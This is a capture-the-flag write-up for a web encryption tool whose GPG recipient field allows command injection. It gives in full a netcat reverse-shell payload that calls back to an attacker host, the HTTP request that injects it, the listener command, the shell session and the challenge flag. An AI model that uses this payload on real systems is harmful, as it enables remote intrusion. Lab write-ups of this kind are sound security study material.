# Dark Encryptor 2

## Challenge Description
> ![image](https://github.com/user-attachments/assets/458f5fc6-f85d-4a15-9f04-afa728761d9d)

## Solution
Upon accessing the website, a simple encryption tool was presented. The interface allowed users to upload file and select a recipient for encryption and download.

![image](https://github.com/user-attachments/assets/b8423e8e-79d5-468e-98b9-d5d6d9c73d8f)

To understand its inner workings, we tested the application by uploading a test file (test.txt) and intercepting the request using **Burp Suite**.

![image](https://github.com/user-attachments/assets/256c76d3-98e2-43ab-b34a-6fc08a20e4fa)

After downloading the encrypted file, we examined its contents using cat:
```
cat 0d121154.gpg
```

The output was binary and unreadable:

![image](https://github.com/user-attachments/assets/4965cd55-5d36-40e3-a9fb-618bf304cb2b)

This confirmed that the application was indeed encrypting the data using GPG.

We then tested various special characters in the recipient field using **Burp Suite Repeater feature**, leading to the following observations:
- ` caused an encryption failure.
- ; caused an encryption failure.

![image](https://github.com/user-attachments/assets/aedfd00e-129a-4b25-835f-eadfbd44e5cb)

This behavior was similar to a previous challenge, Dark Encryptor 1, suggesting a possible command injection vulnerability in the second parameter (recipient field).

Using https://www.revshells.com/, we generated a reverse shell payload:
```
;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.148.139 9000 >/tmp/f)
```
We injected this payload into the recipient field:
```
POST / HTTP/1.1
Host: 10.10.123.113:5000
Content-Length: 369
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://10.10.123.113:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4vOBBwwDsBcQUwo5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.123.113:5000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary4vOBBwwDsBcQUwo5
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundary4vOBBwwDsBcQUwo5
Content-Disposition: form-data; name="recipient"

Cipher ;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.148.139 9000 >/tmp/f)
------WebKitFormBoundary4vOBBwwDsBcQUwo5--
```

And set up a listener on our attacking machine:
```
nc -lvnp 9000
```

Upon execution, we received a shell:
```
listening on [any] 9000 ...
connect to [10.21.148.139] from (UNKNOWN) [10.10.123.113] 48070
sh: 0: can't access tty; job control turned off
```

Using `ls` to list the files:
```
$ ls
app.py
app.py.save
app.wsgi
flag.txt
keys
static
templates
uploads
```

Finally, retrieving the flag:

```
$ cat flag.txt
THM{going_in_bl1nd_2394}
```

## Conclusion
The vulnerability stemmed from unsanitized input in the recipient field, allowing command injection. By leveraging this, we gained a reverse shell and successfully extracted the flag.Conclusion

## Flag: 
THM{going_in_bl1nd_2394}


   
